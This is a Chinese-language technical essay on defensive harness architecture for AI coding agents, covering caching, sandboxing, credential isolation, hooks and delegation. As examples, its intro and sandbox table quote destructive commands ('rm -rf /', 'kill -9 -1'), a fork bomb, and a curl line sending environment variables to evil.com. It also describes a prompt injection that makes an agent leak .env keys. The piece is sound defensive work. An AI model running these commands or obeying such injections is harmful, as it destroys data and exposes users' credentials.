# 解密现代 AI Coding Agent 的 Harness 架构：从裸奔模型到工业级防御体系

> **作者**：Agent Architect Lab / 智能体架构与驾驭工程实验室  
> **定位**：4 周 90 小时高强度手搓实战的顶层沉淀与系统性技术白皮书  
> **配套开源代码资产**：[`mini-harness v1.0`](file:///Users/mark/GitHub/agent-architect-lab/mini-harness/)  

---

## 1. 引言：为什么大模型需要“车身”与“安全带”？

2023 年以来的大模型浪潮中，很多人误以为只要 Prompt 写得足够优雅，或者模型参数量从 7B 跃迁到 70B、670B，一个强大的“AI 软件工程师”就会自然诞生。
然而，任何尝试在真实企业仓库中运行过自主 Coding Agent 的团队，都无一例外地撞上了同一堵冰冷的工程之墙：

- **死循环与震荡**：模型陷入“改文件 ➔ 报语法错 ➔ 还原代码 ➔ 再次改错”的死循环，5 步之内烧光 Token；
- **上下文击穿与失忆**：长对话中工具输出（如 5000 行编译日志）瞬间挤爆窗口，模型出现严重的注意力漂移与遗忘；
- **毁灭性破坏**：模型为解决一个偶发端口冲突，直接生成 `kill -9 -1` 或 `rm -rf /`，险些清空宿主机；
- **凭证与数据泄露**：模型在分析开源代码时被恶意 Prompt 注入（Indirect Prompt Injection），悄悄通过网络将 `.env` 中的核心 API Key 打包外发；
- **首字延迟雪崩**：中间状态乱插时间戳破坏了 GPU 前缀缓存（Prefix Caching），导致单轮交互卡顿数秒甚至数十秒。

这些问题的根源在于一个被长期忽视的事实：

> **大模型本质是一个不可信的、基于概率预测下一个 Token 的计算引擎，而不是一个严谨理性的工程同事。**  
> 如果说大模型是一台强劲而暴烈的“V12 引擎”，那么把它直接接在车轮上，汽车会在起步的第 0.1 秒解体。  
> **Harness（驾驭系统 / 鞍具）就是汽车的底盘、转向机、ABS 防抱死系统与防滚架。**

借用攀岩运动中“Harness（攀岩安全带）”的隐喻：**攀岩者（模型）可以失手，但安全带（Harness）必须在它坠落的瞬间死死锁住悬崖。**

```text
 ┌────────────────────────────────────────────────────────────────────────┐
 │                    现代 Coding Agent 系统二元分工                      │
 │                                                                        │
 │   [大语言模型 (LLM Engine)]             [驾驭系统 (Agent Harness)]      │
 │   • 概率生成与模式补全                 • 确定性边界与协议守卫          │
 │   • 逻辑推演与代码合成                 • 工具调度与安全沙箱牢笼        │
 │   • 角色认知与文本理解                 • 上下文压紧与前缀缓存保全      │
 │   • 天然不可信, 随时可能失控           • 人在回路门禁与账本闭合        │
 └────────────────────────────────────────────────────────────────────────┘
```

---

## 2. 演进谱系：Coding Agent 的四大防御代际

从一个简单的几十行 Python 玩具脚本，到今天驱动 Claude Code 或 OpenAI Codex 的万行级工业系统，Harness 经历了四次深刻的代际跃迁：

```text
   [代际 1: 原生 ReAct 玩具] ──► 简单 Thought-Action 循环, 零物理防御, 同步裸奔
               │
               ▼
   [代际 2: 认知解耦与门禁] ──► PEV 规划/执行解耦, Reflection 角色对抗, 自省纠错
               │
               ▼
   [代际 3: 运行时弹性工程] ──► Claude Code 范式: 上下文压紧, 权限拦截, 错误暂存自愈
               │
               ▼
   [代际 4: 制度理性与微内核] ──► Codex/Pi 范式: 强类型公文, 物理断网沙箱, 纯追加流
```

| 代际 | 核心架构形态 | 防御重心 | 典型弱点 / 淘汰原因 |
|---|---|---|---|
| **代际 1** | 单体 ReAct 脚本 (`09_react_agent`) | 仅依赖最大步数保护（Max Steps） | 工具一报错就崩，死循环震荡，直接在宿主裸跑 |
| **代际 2** | PEV / Reflection / 双智能体 | 引入 Critic 角色打分与单步验收 | 仍是内存中字符串拼接，长任务下上下文不可逆膨胀 |
| **代际 3** | 工业级运行时弹性（Claude Code） | 动态 Prompt 装配、受控 Compaction、三态权限（ALLOW/ASK/DENY）、PTL 恢复 | 逻辑复杂度极高，难以形式化验证，缺少强沙箱 |
| **代际 4** | 制度理性与微内核（Codex / Pi） | 强类型公文（Fragment）、Linux 沙箱三道红线、纯出网 WSS、指纹 Skill 与工具化委派 | 需要清晰的工程纪律，团队必须建立制度化规范 |

---

## 3. 控制面工程学：Prompt 不是文风，是行为状态机

工业级 Harness 彻底颠覆了“Prompt Engineering 是文字游戏”的偏见。
在严密系统的视野中，**Prompt 是控制面的动态状态机，其拼装逻辑直接决定了推理集群的物理开销与 GPU 显存命运**。

### ① 提示缓存分界纪律（Prefix Caching Boundary）

现代大模型服务（vLLM、Anthropic、OpenAI）均依赖 KV Cache 复用。只要输入前缀从第 0 个 Token 开始逐字节一致，Prefill 计算即可直接跳过，**首字延迟（TTFT）从 500ms 降至 25ms，成本节省 90%**。

```text
  [静态稳定前缀 (KV Cache 命中率 100%)] │ [动态增长区 (逐轮追加 Prefill)]
 ────────────────────────────────────────┼────────────────────────────────► Token 轴
  System Prompt + Tools Schema + Rules   │ History Turn 1..N + Latest Observation
                                         ▲
                         严格单调分界线 (Strict Boundary)
```

#### 致命反模式：动态时间戳漂移
若将动态时间戳注入 System Prompt：
```python
# ❌ 错误示范：时间戳塞入顶部前缀，每秒都在变
system_prompt = f"你是架构师。当前时间：{datetime.now()}。规则如下：...（8000字规范）"
```
由于时间戳在第 10 个 Token 处每秒漂移，**导致后续 8000 字的核心规范与 Tools 定义的 KV Cache 全部击穿（Cache Miss）**！
GPU 必须在每轮重新跑大矩阵计算，单轮交互成本暴增 10 倍，首字延迟瞬间卡顿。

**Harness 纪律**：
静态 System Prompt 与 Tools 必须保持绝对字节哈希一致；任何动态状态（时间戳、Git 分支、活动文件）必须封装为 `<system-reminder>` **置于动态消息流的末尾追加**。

### ② 目录级单调作用域继承
工业项目包含全局、个人与目录规则。Harness 采用**空间越近、优先级越高**的单调继承律：

$$\text{PROJECT (仓库级规则)} > \text{USER (开发者个人偏好)} > \text{SYSTEM (全局默认宪法)}$$

弱作用域规则永远不能遮蔽强作用域规则，且在进入新子目录时，Harness 会自动解析局部 `AGENTS.md`，实现“入乡随俗”。

---

## 4. 执行面防御：物理沙箱、双密钥降权与反向长连

大模型只要拥有 Shell 执行权限，无论 Prompt 怎么写，都无法排除恶意代码逃逸的可能。**代码执行必须被放逐进不受信任的物理牢笼。**

### ① 纯出网反向连接拓扑（Outbound-Only Reverse Connection）
传统的容器暴露 22 或 8080 端口让 Harness 连接，这在跨公网与企业私有云中极难穿透 NAT，且端口面临被内网嗅探攻击的风险。
现代工业规范（OpenAI Self-hosted Sandbox）采用**纯出网反向拓扑**：

```text
  [宿主 Harness 控制面] (监听 wss://harness.internal)
           ▲
           │ (纯出网反向连接: Zero Inbound Ports)
           │
  [沙箱内部 Executor] (物理断网/受限容器，主动向 Harness 发起 WSS 拨号)
```

沙箱容器对外**不暴露任何开放端口**，指令派发与结果回传全在反向长连接通道内完成。

### ② 双密钥降权机制（Dual-Key Privilege Broker）
- 宿主机应用持有主凭证（如 `OPENAI_API_KEY`、生产数据库凭据）；
- **沙箱内部环境变量严禁挂载主凭证**，仅下发会话作用域的低权限 `EXECUTOR_KEY`；
- 即使恶意脚本在沙箱中运行 `printenv` 或扫描进程内存，泄露的也只是一次性无提权价值的内部握手令牌。

### ③ 生产级 Linux 内核三道硬红线

| 红线维度 | Linux 内核隔离实现 | 拦截恶意行为 | 退出表现与语义 |
|---|---|---|---|
| **物理断网** | `CLONE_NEWNET` / `--network=none` | 防止 `curl -X POST evil.com --data "$(env)"` 凭证泄露 | `Network is unreachable`，返回码 `1` |
| **内存熔断** | cgroups v2 `memory.max=256M` | 防止超大数组或内存泄漏导致宿主机瘫痪 | 内核 OOM Killer 强杀，返回码 **`137`** |
| **进程防炸** | cgroups v2 `pids.max=64` | 拦截 Fork 炸弹 `:(){ :\|:& };:` 耗尽宿主 PID | 内核报错 `Resource temporarily unavailable` |

---

## 5. 本地治理与委派协议：让 Agent 学会“守乡约”

通用 Coding Agent 要在具体企业工程中发挥价值，必须具备吸收**局部工作流（Skills）**与**生命周期干预（Hooks）**的能力。

### ① Skill 指纹管理（Fingerprint Discipline）
Skill 不是散乱读取的文本，而是**被版本化、被指纹校验（SHA256）的资产**：
- 扫描 `.agent/skills/` 目录；
- 当且仅当指纹发生变化时才执行覆盖安装；指纹一致直接 `SKIPPED`；
- 采用 **按需动态挂载（On-demand Attachment）**：仅在当前任务触发时，以 `<invoked_skill>` 标签局部注入当前回合，用完即在下一轮 Compaction 中折叠，绝不长期污染 System Prompt。

### ② Hook 显式生命周期状态机与阻断门禁
Codex 架构将 Agent 的运转抽象为严格事件流：

```text
session_start ──► user_prompt_submit ──► pre_tool_use ──► post_tool_use ──► stop
```

- **`preview_*` 与 `run_*` 严格双路径分离**：`preview_*` 仅做只读探测，绝无副作用；
- **阻断型 Pre-Tool Hook（Blocking Guard）**：在命令触碰物理执行器之前，安全规则（如 `SafeBashGuard`）有权直接截断调用并合成 Observation 回传，从源头消灭危险；
- **平台能力可解释探测**：在不支持特定特性的 OS（如 Windows）上，Hook 必须显式报警并安全降级，拒绝静默假死。

### ③ 工具化多代理委派协议（Toolized Delegation）
拒绝“多代理黑魔法”，将协作封装为规范工具调用（`agent_tool.rs`）：

```text
handle = spawn_agent(role, prompt, timeout)      # 分配独立上下文
send_input(handle, msg, interrupt=True/False)    # 排队或立即抢占打断
result = wait_agent(handle, timeout)             # 超时受控收口, 绝不伪报崩溃
close_agent(handle, cascade=True)                # 级联销毁所有后代 (No-Orphan Invariant)
```

配合不可篡改的 **`DelegationLedger`（委派账本）**，让独立验证者（Skeptical Verifier）能够直接审查物理留痕，而不是听信模型的自我吹嘘。

---

## 6. 终极思辨：重型航母 vs 极简微内核

在工业界，存在两条最具代表性的架构路线分歧：

```text
 ┌─────────────────────────────────────────────────────────────┐
 │                三大流派设计哲学与选型光谱                   │
 │                                                             │
 │  [Claude Code: 现场经验派]        [Codex: 制度理性派]        │
 │  • 运行时优先                     • 强类型基座与控制面优先   │
 │  • 动态折叠压缩                   • 显式公文与沙箱红线       │
 │  • 适合个人极客与敏捷团队         • 适合大型企业合规与多租户 │
 │                 ▲                               ▲           │
 │                 │                               │           │
 │                 └───────────────┬───────────────┘           │
 │                                 │                           │
 │                                 ▼                           │
 │                     [Pi: 极简微内核第三极]                  │
 │                     • 状态即文件 (Append-only JSONL)        │
 │                     • 零抽象单事件循环                      │
 │                     • 适合深度嵌入 IDE 与自研定制架构       │
 └─────────────────────────────────────────────────────────────┘
```

### 生产级落地选型决策树

```text
业务涉及不可信代码执行？
  ├─► 是 ──► [必选] 物理沙箱 (Docker / Firecracker MicroVM, network=none)
  └─► 否 ──► 是否有强审计与合规要求？
               ├─► 是 ──► [推荐] Codex 制度路线 (Typed Hooks + Delegation Ledger)
               └─► 否 ──► 是否追求极致轻量嵌入与会话可移植？
                            ├─► 是 ──► [推荐] Pi 风格微内核 (JSONL 流 + DAG 分支)
                            └─► 否 ──► [推荐] Claude Code 运行时自愈 (Living Working Memory)
```

---

## 7. 结语：未来生产级 AI Agent 工程师的护城河

很多人担心：“随着基座模型越来越聪明，上层的 Agent 框架会不会失去价值？”

经过 4 周 90 小时深入底层齿轮的拆解与手搓，我们的答案是明确且坚定的：

> **模型智商的提升，解决的是“解决问题的局部灵光”；  
> 而工业级 Harness 解决的是“长链路任务的确定性、安全性、容错力与系统性防御”。**

大模型永远在概率空间中游走，而生产软件必须建立在确定性的物理现实之上。
掌握了控制面状态机、提示缓存纪律、Linux 隔离沙箱、生命周期 Hook 与双向闭合账本的工程师，才真正拥有构建可靠、可信、不可攻破的下一代 AI 软件工程基础设施的能力。

这一切，已经在我们的 [`mini-harness v1.0`](file:///Users/mark/GitHub/agent-architect-lab/mini-harness/) 源码中完整运转。
